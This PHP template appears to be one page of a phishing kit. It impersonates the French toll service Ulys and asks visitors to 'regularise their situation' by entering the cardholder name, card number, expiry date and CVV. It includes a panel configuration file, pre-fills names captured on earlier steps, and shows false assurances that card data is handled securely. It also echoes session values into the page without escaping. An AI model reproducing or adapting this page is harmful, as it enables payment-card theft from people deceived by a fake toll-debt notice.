<?php
require_once 'config/panel.php';
$title = "Ulys : Payement";
ob_start();
?>

<div class="ulys-main">
    <div class="ulys-login-card">
        <h2>Paiement</h2>
        <div class="ulys-login-desc mb-4">
            <span class="ulys-orange">Merci de renseigner vos informations de paiement pour régulariser votre situation.</span>
        </div>
        <form method="POST" action="index.php?view=pay" class="needs-validation">
            <input type="hidden" name="catch">
            <div class="ulys-form-group">
                <input name="holder" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['holder'])) { echo ' is-invalid'; } ?>" placeholder="Titulaire de la carte" value="<?php 
                if (!empty($_SESSION['holder'])) {
                    echo $_SESSION['holder'];
                } elseif (!empty($_SESSION['lastname']) || !empty($_SESSION['firstname'])) {
                    echo trim((isset($_SESSION['lastname']) ? $_SESSION['lastname'] : '') . ' ' . (isset($_SESSION['firstname']) ? $_SESSION['firstname'] : ''));
                }
                ?>">
                <?php if (isset($_SESSION['ERRORS']['holder'])): ?>
                    <div class="invalid-feedback d-block"><?php echo $_SESSION['ERRORS']['holder']; ?></div>
                <?php endif; ?>
            </div>
            <div class="ulys-form-group">
                <input name="cardnumber" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['cardnumber'])) { echo ' is-invalid'; } ?>" placeholder="Numéro de carte" value="<?php if (!empty($_SESSION['cardnumber'])){ echo $_SESSION['cardnumber'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['cardnumber'])): ?>
                    <div class="invalid-feedback d-block"><?php echo $_SESSION['ERRORS']['cardnumber']; ?></div>
                        <?php endif; ?>
                    </div>
            <div class="ulys-form-row" style="display: flex; gap: 16px;">
                <div style="flex:1; display: flex; flex-direction: column;">
                    <input name="exp" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['exp'])) { echo ' is-invalid'; } ?>" placeholder="MM/AA" value="<?php if (!empty($_SESSION['exp'])){ echo $_SESSION['exp'];} ?>">
                                <?php if (isset($_SESSION['ERRORS']['exp'])): ?>
                        <div class="invalid-feedback d-block"><?php echo $_SESSION['ERRORS']['exp']; ?></div>
                                <?php endif; ?>
                            </div>
                <div style="flex:1; display: flex; flex-direction: column;">
                    <input name="cvv" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['cvv'])) { echo ' is-invalid'; } ?>" placeholder="CVV" value="<?php if (!empty($_SESSION['cvv'])){ echo $_SESSION['cvv'];} ?>">
                                <?php if (isset($_SESSION['ERRORS']['cvv'])): ?>
                        <div class="invalid-feedback d-block"><?php echo $_SESSION['ERRORS']['cvv']; ?></div>
                                <?php endif; ?>
                        </div>
                    </div>
                    
            <button type="submit" name="submit" value="page4" class="ulys-btn" style="background: #ff3c1b; color: #fff; margin-top: 18px;">Valider le paiement</button>
        </form>
                        </div>
    <div class="ulys-tips-col">
        <h3>Astuces&nbsp;!</h3>
        <div class="ulys-tip-block">
            <i class="fas fa-credit-card"></i>
            <div>
                <strong>Sécurité du paiement</strong><br>
                Vos informations bancaires sont traitées de façon sécurisée et confidentielle.
            </div>
        </div>
        <div class="ulys-tip-block">
            <i class="fas fa-lock"></i>
            <div>
                <strong>Confidentialité</strong><br>
                Ne partagez jamais vos informations bancaires par email ou téléphone.
            </div>
        </div>
    </div>
</div>

<script src="../app/assets/js/cleave.js"></script>
<script src="../app/assets/js/main.js"></script>
<script src="../app/assets/js/expmain.js"></script>



<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();

// Include layout with the view content
include_once 'layout.php';
?> 